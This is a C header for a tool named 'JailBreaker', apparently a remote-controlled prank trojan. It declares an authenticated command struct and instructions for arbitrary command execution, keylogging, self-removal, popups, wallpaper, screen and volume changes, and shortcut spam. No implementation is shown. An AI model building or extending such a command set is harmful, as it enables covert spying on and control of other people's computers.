#ifndef FUN
#define FUN

#include "../Main.h"

/*
    **********************
    * JB_Instruction set *
    **********************

    --optional arguments are market with -opt
    --instructions with no args have (void)

    JB_FUN      (void)
    JB_DEACTIVE (void)
    JB_REMOVE   (void) 

    JB_VOLUME   [vol]
    JB_SZAMBO   [soundFilePath]

    JB_SETWALL  [walpPath]
    JB_SAVEWALL (void)
    JB_LOADWALL (void)

    JB_LINKMAKE [linkCount-opt def:100]
    JB_LINKDEL  (void)

    JB_OPENWEB  [site]
    JB_CDEJECT  (void)
    JB_POPUPW   [msg] [wTitle-opt def:JB]
    JB_POPUPA   [msg] [wTitle-opt def:JB]
    JB_EXEC     [cmd]
    JB_ROTATESCR[angle] (0-default, 1-90deg, 2-180deg, 3-270deg)
    JB_CHANGERES[res]   
    JB_LOGKEYS  (void)
*/

typedef enum {
    /* --- Templates --- */
    JB_FUN,         // FUN
    JB_DEACTIVE,    // Deactive jailbraker
    JB_REMOVE,      // Delete from pc completely

    /* --- Sounds --- */
    JB_VOLUME,      // set system volume
    JB_SZAMBO,      // paly sound

    /* --- Wallpaper --- */
    JB_SETWALL,     // set wallpaper to an image
    JB_SAVEWALL,    // save current wallpaper
    JB_LOADWALL,    // load saved wallpaper

    /* --- Shortcuts --- */
    JB_LINKMAKE,    // create desktop shortcuts to onestop.midi
    JB_LINKDEL,     // delete all shortcuts

    /* --- Other --- */
    JB_OPENWEB,     // Open website in default browser
    JB_CDEJECT,     // Eject disk drive
    JB_POPUPW,      // MessageBoxW
    JB_POPUPA,      // MessageBoxA
    JB_EXEC,        // execute a cmdlet
    JB_ROTATESCR,   // SetDisplayAutoRotationPreferences
    JB_CHANGERES,   // set screen resolution
    JB_LOGKEYS      // keylogging bruh.   
} JB_Instruction;

typedef struct {
    char auth[AUTH_LENGTH];
    JB_Instruction cmd;     // JB_POPUP "Title¿"Polskie szamba liderem są w kraju"\0"
    char args[CMD_ARGSZ];
} JBCMD; // JailBreaker Command

//WINBOOL changeWallpaper(char *path);  // I think we don't need to expose it

void execCommand(JBCMD cmd); // star of the show

#endif